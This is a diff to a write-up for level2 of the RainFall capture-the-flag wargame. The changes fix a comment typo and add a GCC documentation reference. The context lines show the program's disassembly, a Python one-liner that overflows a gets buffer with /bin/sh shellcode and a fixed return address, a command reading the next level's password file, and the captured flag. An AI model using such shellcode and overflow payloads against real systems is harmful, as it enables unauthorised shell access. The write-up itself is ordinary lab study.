@@ -6,7 +6,7 @@
  80484df:       89 04 24                mov    DWORD PTR [esp],eax      ; eax as first argument to function
  80484e2:       e8 c9 fe ff ff          call   80483b0 <fflush@plt>     ; fflush(stdout)
  80484e7:       8d 45 b4                lea    eax,[ebp-0x4c]           ; load to eax the stack - 76 bytes address
- 80484ea:       89 04 24                mov    DWORD PTR [esp],eax      ; eax as argument to funciton
+ 80484ea:       89 04 24                mov    DWORD PTR [esp],eax      ; eax as argument to function
  80484ed:       e8 ce fe ff ff          call   80483c0 <gets@plt>       ; gets to this buffer
  80484f2:       8b 45 04                mov    eax,DWORD PTR [ebp+0x4]  ; load value in stack + 4 to eax 
  80484f5:       89 45 f4                mov    DWORD PTR [ebp-0xc],eax  ; put eax into stack - 16 
@@ -65,3 +65,8 @@ Shellcode from: https://beta.hackndo.com/buffer-overflow/
 --> level2@RainFall:~$ (python -c "print 'A' * 35 + '\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh' + '\x08\xa0\x04\x08'" ; cat) | ./level2
 cat /home/user/level3/.pass
 492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
+
+
+
+// __builtin_return_address
+// https://gcc.gnu.org/onlinedocs/gcc/Return-Address.html
